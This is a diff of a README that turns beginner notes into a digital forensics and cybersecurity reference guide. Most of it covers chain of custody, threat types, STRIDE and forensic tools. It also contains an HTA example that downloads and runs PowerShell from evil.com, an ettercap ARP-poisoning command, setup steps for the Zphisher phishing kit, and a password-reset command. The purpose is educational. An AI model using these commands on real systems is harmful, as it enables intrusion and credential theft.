@@ -1,245 +1,235 @@
-# 🕵 Digital Forensics & Cybersecurity Basics – Field Notes
+# 🔍 Digital Forensics & Cybersecurity Comprehensive Guide
 
-**Author:** Anubhav Mohandas
-**Platform:** Windows & Kali Linux
-**Purpose:** Practical notes from early learning in Digital Forensics (DF), Cyber Forensics (CF), and related cybersecurity concepts.
-**Note:** This is a structured compilation of topics, commands, and tools mentioned during the learning journey, with explanations and relevant resources.
+A complete reference guide covering **Digital Forensics (DF)**, **Cyber Forensics (CF)**, and essential cybersecurity concepts with practical examples and tools.
 
----
+## 📋 Table of Contents
 
-## 1️⃣ DF vs CF – Understanding the Basics
-
-| Term                       | Description                                                                                      |
-| -------------------------- | ------------------------------------------------------------------------------------------------ |
-| **Digital Forensics (DF)** | Broad discipline focusing on acquiring, analyzing, and presenting evidence from digital devices. |
-| **Cyber Forensics (CF)**   | Subset of DF, specifically investigating cybercrimes and network-related incidents.              |
-
----
-
-## 2️⃣ Chain of Custody Principles
-
-The **chain of custody** ensures evidence remains admissible in court by maintaining integrity from collection to presentation.
-
-**Key Rules:**
-
-1. **Keep in confinement** – Secure evidence in a controlled environment.
-2. **Non-repudiation** – Maintain proof of authenticity so no one can deny involvement.
-3. **No tampering** – Preserve the original state of the evidence.
+* [📘 Basic Concepts](#-basic-concepts)
+* [🔗 Chain of Custody](#-chain-of-custody)
+* [🛡️ Security vs Privacy](#️-security-vs-privacy)
+* [🎭 Threat Types & Attack Vectors](#-threat-types--attack-vectors)
+* [🛠️ Forensics Tools & Techniques](#️-forensics-tools--techniques)
+* [🦠 Malware Analysis](#-malware-analysis)
+* [💾 Data Acquisition](#-data-acquisition)
+* [🔄 Forensic Lifecycle](#-forensic-lifecycle)
+* [🚨 STRIDE Framework](#-stride-framework)
+* [🧰 Essential Tools List](#-essential-tools-list)
+* [🖥️ Windows Security & Authentication](#️-windows-security--authentication)
+* [🕵️ Anti-Forensics Techniques](#-anti-forensics-techniques)
+* [🔬 Advanced Concepts](#-advanced-concepts)
+* [📚 Additional Resources](#-additional-resources)
 
 ---
 
-## 3️⃣ Security vs Privacy
+## 📘 Basic Concepts
 
-* **Security** → Protecting assets from unauthorized access (e.g., firewalls, encryption).
-* **Privacy** → Protecting identity-specific and personal information from exposure.
+### 🆚 Digital Forensics (DF) vs Cyber Forensics (CF)
 
----
-
-## 4️⃣ Threat Types
-
-| Threat                 | Description                                                         | Example                   |
-| ---------------------- | ------------------------------------------------------------------- | ------------------------- |
-| **Malware**            | Malicious software to disrupt, damage, or gain unauthorized access. | Trojan, Ransomware        |
-| **Phishing**           | Fraudulent attempts to obtain sensitive information.                | Fake bank login page      |
-| **Spear Phishing**     | Targeted phishing attack aimed at a specific person or group.       | CEO fraud email           |
-| **Spoofing**           | Pretending to be someone else to mislead.                           | Email header manipulation |
-| **Social Engineering** | Exploiting human behavior for access.                               | Fake IT support call      |
+| Aspect                  | Digital Forensics (DF)                             | Cyber Forensics (CF)                    |
+| ----------------------- | -------------------------------------------------- | --------------------------------------- |
+| **📜 Scope**            | Broad discipline covering all digital devices      | Focus on cybercrime & network incidents |
+| **📂 Evidence Sources** | Computers, mobiles, IoT, storage                   | Network logs, servers, communications   |
+| **🎯 Primary Use**      | Criminal/civil investigations, corporate incidents | Cybercrime investigations, breaches     |
 
 ---
 
-## 5️⃣ Common Tools & Concepts
+## 🔗 Chain of Custody
 
-* **Zphisher** → Tool for creating phishing pages
-  🔗 [Download Zphisher](https://github.com/htr-tech/zphisher)
+**3️⃣ Core Principles:**
 
-* **MITM (Man-in-the-Middle)** → Intercepting communication between two parties.
+1. 🛅 **Keep in Confinement** – Secure storage, tamper-evident bags, access controls
+2. ✍️ **Non-Repudiation** – Digital signatures, timestamps, handling logs
+3. 🔒 **No Tampering** – Write blockers, forensic copies, preserve originals
 
-  * Technique: **ARP Spoofing/Poisoning**
-    🔗 [Bettercap](https://www.bettercap.org/) or `arpspoof` in Kali.
+📄 **Example Log:**
 
-* **Forensics Data Formats**
-
-  * **PCAP** – Packet capture files (Wireshark, tcpdump)
-  * **XDR** – Extended Detection & Response systems
-  * **EDR** – Endpoint Detection & Response tools
-  * **NGFW** – Next-Gen Firewalls
-  * **DLP** – Data Loss Prevention systems
-
-* **SIEM Recommendation**: [Wazuh](https://wazuh.com/)
-
-* **Malware Analysis**
-
-  * **Static Analysis** → Structural inspection without execution (e.g., using [Ghidra](https://ghidra-sre.org/))
-  * **Dynamic Analysis** → Behavioral monitoring during execution (sandbox environments).
-
-* **BOSS THE SOC** → Free SOC practice platform
-  🔗 [BOSS the SOC](https://www.crowdstrike.com/freetools/boss-the-soc/)
-
-* **SET (Social Engineering Toolkit)** → Phishing, credential harvesting
-  🔗 [Download SET](https://github.com/trustedsec/social-engineer-toolkit)
+```
+Evidence ID: CASE-2024-001-HD01
+Item: Suspect's Laptop Hard Drive
+Date/Time: 2024-01-15 09:30
+Collected by: Detective Smith (#1234)
+Transferred to: Forensics Lab Tech Johnson
+Date/Time: 2024-01-15 11:45
+Purpose: Digital forensic analysis
+```
 
 ---
 
-## 6️⃣ Malware Types
+## 🛡️ Security vs Privacy
 
-1. **File-based** → Needs a file to execute (e.g., EXE trojan).
-2. **File-less** → Resides in memory; doesn’t write malicious files to disk.
-3. **Zero-click** → Exploits vulnerabilities without user interaction.
-
----
-
-## 7️⃣ Special Terms
-
-* **HTA Attack** – HTML Application file used to execute malicious code on Windows. 🔗 [Research HTA Attack](https://attack.mitre.org/techniques/T1173/)
-* **Reverse Shell** – Hacker gains control by making the victim connect back to them.
-* **netstat -A -n -o** – View active connections and process IDs to spot suspicious remote access.
+* **🛡️ Security** – Protecting assets from unauthorized access/modification
+  *Example:* Firewalls, encryption, access controls
+* **🔏 Privacy** – Protecting identity-specific personal data
+  *Example:* GDPR compliance, anonymization
 
 ---
 
-## 8️⃣ Data Acquisition
+## 🎭 Threat Types & Attack Vectors
 
-* **Logical Acquisition** → Copies specific files/folders without free space.
-* **Physical Acquisition** → Full disk copy including deleted data.
-* **Faraday Bag** → Blocks all signals to an electronic device.
+### 🦠 Malware
 
----
+* **Trojan** – Disguised as legitimate software
+* **Ransomware** – Encrypts files, demands payment
+* **Rootkit** – Hides malicious activity
 
-## 9️⃣ Important Notes
+### 🎣 Phishing
 
-* **Ethical Hacking** → Offensive security
-* **Cybersecurity** → Defensive security
-* **SQL Injection** → Client-side attack
-* **Event Viewer** → Logs system events; hackers may clear logs to hide tracks.
+* **Standard** – Mass targeting
+* **Spear** – Targeted
+* **Whaling** – High-profile targets
+  💌 *Fake Email Example:*
 
----
+```
+From: security@bankofamerica-secure.com
+Subject: Urgent: Account Verification
+Click here to verify your account within 24 hours...
+```
 
-## 🔟 Research Topics
+### 🎭 Spoofing
 
-* **MITRE ATT\&CK** → [MITRE ATT\&CK Framework](https://attack.mitre.org/)
-* **Mimikatz** → Tool for extracting passwords, hashes, PINs.
-  🔗 [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
+* **Email** – Fake sender
+* **IP** – Forged addresses
+* **DNS** – Malicious redirection
 
----
+### 🧠 Social Engineering
 
-## 1️⃣1️⃣ Forensic Lifecycle
-
-**Identification → Collection → Analysis → Documentation → Preservation**
-
----
-
-## 1️⃣2️⃣ STRIDE Framework
-
-| Category                   | Example                             |
-| -------------------------- | ----------------------------------- |
-| **Spoofing**               | Email spoofing via fake SMTP server |
-| **Tampering**              | MITM altering data                  |
-| **Repudiation**            | Denying performed actions           |
-| **Information Disclosure** | Leaking sensitive data              |
-| **Denial of Service**      | Server flooding                     |
-| **Elevation of Privilege** | Exploiting UAC bypass               |
+* Pretending to be IT support
+* Tailgating into secure areas
+* USB baiting
 
 ---
 
-## 1️⃣3️⃣ Miscellaneous Security Concepts
+## 🛠️ Forensics Tools & Techniques
 
-* **WakeLock** – Android feature controlling background tasks.
-* **MSFVenom → APK → JAR Signing → Zip Align → Keystore** – Android payload creation.
-* **Data Certificate vs Digital Certificate** –
+### 🕸️ Zphisher
 
-  * **Data Certificate** → Proof of a file/data’s authenticity.
-  * **Digital Certificate** → Cryptographic proof of identity for secure communication.
-* **Shodan** – Search engine for internet-connected devices.
-  🔗 [Shodan](https://www.shodan.io/)
-* **Protocol Downgrade Attack** – Forcing HTTPS to HTTP.
+```bash
+git clone https://github.com/htr-tech/zphisher
+cd zphisher && chmod +x zphisher.sh && ./zphisher.sh
+```
 
----
+🔗 [Zphisher GitHub](https://github.com/htr-tech/zphisher)
 
-## 1️⃣4️⃣ Privilege Escalation
+### 💻 MITM Attacks
 
-* **UAC Bypass** → User Access Control is bypassed to gain admin rights.
-* **Botnets**:
-
-  * **Zeus** – Banking trojan botnet
-  * **Mirai** – IoT botnet
+* **Ettercap** – `ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//`
+* **Bettercap** – `sudo bettercap -iface wlan0`
+  🔗 [Bettercap](https://www.bettercap.org/)
 
 ---
 
-## 1️⃣5️⃣ Forensics Tools List
+## 🦠 Malware Analysis
 
-| Tool                   | Purpose                 | Download                                                         |
-| ---------------------- | ----------------------- | ---------------------------------------------------------------- |
-| Autopsy                | Digital forensics       | [Autopsy](https://www.autopsy.com/)                              |
-| Cyber Triage           | Incident response       | [Cyber Triage](https://www.cybertriage.com/)                     |
-| MAGNET Axiom           | Advanced forensics      | [Magnet Axiom](https://www.magnetforensics.com/products/axiom/)  |
-| Belkasoft X            | Comprehensive DFIR      | [Belkasoft](https://belkasoft.com/)                              |
-| MOBILedit              | Mobile device forensics | [MOBILedit](https://www.mobiledit.com/)                          |
-| OSForensics            | Forensics toolkit       | [OSForensics](https://www.osforensics.com/)                      |
-| Ghidra                 | Reverse engineering     | [Ghidra](https://ghidra-sre.org/)                                |
-| OllyDbg                | Debugging tool          | [OllyDbg](http://www.ollydbg.de/)                                |
-| x64dbg                 | Debugging tool          | [x64dbg](https://x64dbg.com/)                                    |
-| Systools Mail Examiner | Email forensics         | [Mail Examiner](https://www.mailxaminer.com/)                    |
-| Velociraptor           | Endpoint monitoring     | [Velociraptor](https://www.velocidex.com/)                       |
-| FTK Imager             | Evidence acquisition    | [FTK Imager](https://accessdata.com/product-download/ftk-imager) |
+### 🔍 Static Analysis
 
----
+* **Ghidra** – [Download](https://ghidra-sre.org/)
+* **OllyDbg** – [Download](http://www.ollydbg.de/)
+* **x64dbg** – [Download](https://x64dbg.com/)
 
-## 1️⃣6️⃣ Belkasoft Practice Lab
+### ⚙️ Dynamic Analysis
 
-Belkasoft offers a **30-day trial** and CTF challenges.
+* **Cuckoo Sandbox**, **Any.run**
 
-* **Download Trial:** [Belkasoft Trial](https://belkasoft.com/trial)
-* **CTF Challenge:** [Belkasoft CTF May](https://belkasoft.com/ctf_may/chall)
+### 💥 HTA Attack Example
+
+```html
+<script>
+  var shell = new ActiveXObject("WScript.Shell");
+  shell.run("powershell -c IEX(New-Object Net.WebClient).downloadString('http://evil.com/payload.ps1')");
+</script>
+```
+
+🔗 [MITRE T1218.005](https://attack.mitre.org/techniques/T1218/005/)
 
 ---
 
-## 1️⃣7️⃣ Anti-Forensics in Windows
+## 💾 Data Acquisition
 
-Anti-forensics aims to make forensic investigation harder. Example repo:
-🔗 [Windows Anti-Forensics Scripts](https://github.com/MikeHorn-git/WAFS)
+* **📂 Logical** – Faster, targeted files
+* **💽 Physical** – Bit-by-bit, includes deleted data
 
----
-
-## 1️⃣8️⃣ Event ID Reference
-
-Microsoft list of **important Windows Event IDs**:
-🔗 [Events to Monitor](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor)
+📦 **Faraday Bag** – Blocks all wireless signals, prevents remote wiping
 
 ---
 
-## 1️⃣9️⃣ Authentication Mechanisms
+## 🔄 Forensic Lifecycle
 
-* **Password-based**
-* **Multi-Factor (MFA)**
-* **Certificate-based**
-* **Biometric**
+1. 🔍 Identification
+2. 📦 Collection
+3. 🧪 Analysis
+4. 📝 Documentation
+5. 🗄️ Preservation
 
 ---
 
-## 2️⃣0️⃣ Windows Local Account Password Change (Without Current Password)
+## 🚨 STRIDE Framework
 
-**Scenario:** Windows system with a **local account** (not Microsoft-linked).
+| Letter | Threat           | Example             | Mitigation       |
+| ------ | ---------------- | ------------------- | ---------------- |
+| S      | Spoofing         | Email/IP spoofing   | Strong auth      |
+| T      | Tampering        | MITM, SQL injection | Integrity checks |
+| R      | Repudiation      | Action denial       | Audit trails     |
+| I      | Info Disclosure  | Data leaks          | Encryption       |
+| D      | DoS              | Flood attacks       | Rate limiting    |
+| E      | Priv. Escalation | Buffer overflows    | Least privilege  |
 
-**Steps:**
+---
 
-1. Open **Command Prompt as Administrator**.
-2. Run:
+## 🧰 Essential Tools List
 
-   ```cmd
-   net user
-   ```
+| Tool         | Purpose             | Link                                     |
+| ------------ | ------------------- | ---------------------------------------- |
+| Autopsy      | Digital forensics   | [🔗](https://www.autopsy.com/download/)  |
+| FTK Imager   | Evidence imaging    | [🔗](https://www.exterro.com/ftk-imager) |
+| Ghidra       | Reverse engineering | [🔗](https://ghidra-sre.org/)            |
+| Velociraptor | Endpoint monitoring | [🔗](https://www.velocidex.com/)         |
 
-   → Lists all local users.
-3. Change password for a specific user:
+---
 
-   ```cmd
-   net user USERNAME NEWPASSWORD
-   ```
+## 🖥️ Windows Security & Authentication
 
-   Example:
+```cmd
+net user        # List users
+net user user1 newpass123!   # Reset password
+netstat -A -n -o  # Check network connections
+```
 
-   ```cmd
-   net user anubhav Pass@123
-   ```
+🔍 Look for unknown outbound TCP connections.
 
-   ✅ This does not ask for the current password.
+---
 
+## 🕵️ Anti-Forensics Techniques
+📄 [Anti Forensics Github](https://github.com/MikeHorn-git/WAFS?tab=readme-ov-file)
+
+* 🗑️ Log deletion
+* 🧹 Secure wiping
+* ⏳ Timestamp tampering
+* 🛡️ Encryption
+
+📄 [Windows Event IDs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor)
+Key IDs: 4624 (logon), 4724 (password reset), 1102 (log cleared)
+
+---
+
+## 🔬 Advanced Concepts
+
+* 📱 **WakeLock abuse** in Android
+* 📦 **APK Manipulation** with `msfvenom`, `jarsigner`
+* 🌐 **Shodan** for exposed devices – [Shodan.io](https://www.shodan.io/)
+* 🔑 **Mimikatz** credential extraction – [GitHub](https://github.com/gentilkiwi/mimikatz)
+
+---
+
+## 📚 Additional Resources
+
+* 🗂️ [MITRE ATT\&CK](https://attack.mitre.org/)
+* 🛡️ [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
+* 🎓 [SANS DFIR](https://www.sans.org/cyber-aces/)
+* 🏛️ [CISA](https://www.cisa.gov/)
+
+---
+
+**⚠️ Disclaimer:** For **educational use only**. Unauthorized use may violate laws.
+**📜 License:** MIT License.
+
+---
